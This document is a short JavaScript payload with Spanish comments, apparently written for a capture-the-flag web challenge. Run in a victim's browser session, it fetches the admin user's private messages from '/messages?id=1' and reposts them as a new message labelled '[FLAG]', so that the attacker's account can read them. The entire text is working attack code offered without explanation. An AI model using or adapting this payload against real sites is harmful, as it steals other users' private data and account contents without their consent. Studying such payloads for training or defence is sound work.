(async () => {
  try {
    // Pedimos los mensajes del admin (id=1)
    const r = await fetch('/messages?id=1');
    const data = await r.json();

    // Extraemos todos los mensajes como texto
    const flag = data.messages.map(m => m.message).join('\n');

    // Enviamos la flag de vuelta a nuestra cuenta como nuevo mensaje
    await fetch('/create_msg', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: '[FLAG]\n' + flag })
    });
  } catch (e) {
    // Si algo falla, que también lo deje anotado
    await fetch('/create_msg', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ message: 'Error: ' + e })
    });
  }
})();
